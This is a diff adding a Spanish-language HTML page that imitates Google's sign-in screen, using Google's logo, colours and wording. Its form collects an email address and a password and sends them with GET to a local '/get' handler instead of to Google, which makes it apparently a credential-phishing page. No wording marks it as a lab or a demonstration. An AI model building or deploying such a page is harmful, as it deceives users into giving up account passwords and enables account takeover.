@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Google - Iniciar sesión</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f5f5f5; /* Fondo gris claro */
+        }
+        .login-container {
+            background-color: #fff; /* Fondo blanco */
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center; /* Centramos el contenido */
+        }
+        #logo {
+            margin-bottom: 20px;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #202124; /* Color de texto oscuro */
+        }
+        h2 {
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #5f6368; /* Texto más claro */
+        }
+        .g-input {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .gbtn-primary {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            background-color: #1a73e8; /* Color azul Google */
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .gbtn-primary:hover {
+            background-color: #1669c1; /* Azul más oscuro al hacer hover */
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div id="logo">
+            <!-- Aquí puedes incluir un SVG de Google o una imagen del logo de Google -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width="100">
+        </div>
+        <h1>Iniciar sesión</h1>
+        <h2>Con tu cuenta de Google</h2>
+        <form action="/get" id="email-form-step">
+            <input name="email" type="email" class="g-input" placeholder="Correo electrónico" required>
+            <input name="password" type="password" class="g-input" placeholder="Contraseña" required>
+            <button class="gbtn-primary" type="submit">Siguiente</button>
+        </form>
+        <div class="footer">
+            <p>¿No tienes cuenta? <a href="#">Crea una cuenta</a></p>
+        </div>
+    </div>
+</body>
+</html>
